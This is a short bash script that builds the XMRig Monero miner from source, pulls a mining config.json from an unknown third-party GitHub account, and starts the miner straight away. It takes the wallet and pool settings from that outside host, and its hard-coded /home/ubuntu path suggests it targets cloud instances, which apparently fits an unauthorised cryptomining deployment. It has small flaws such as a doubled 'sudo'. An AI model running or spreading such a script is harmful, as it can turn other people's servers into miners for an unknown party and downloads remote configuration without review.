#!/bin/bash
sudo apt-get update
sudo sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev -y
sudo git clone https://github.com/xmrig/xmrig.git
cd xmrig
sudo mkdir build
cd build
sudo cmake ..
sudo make
curl "https://raw.githubusercontent.com/p1vynodejs/xmrig/master/config.json" > /home/ubuntu/xmrig/build/config.json
./xmrig
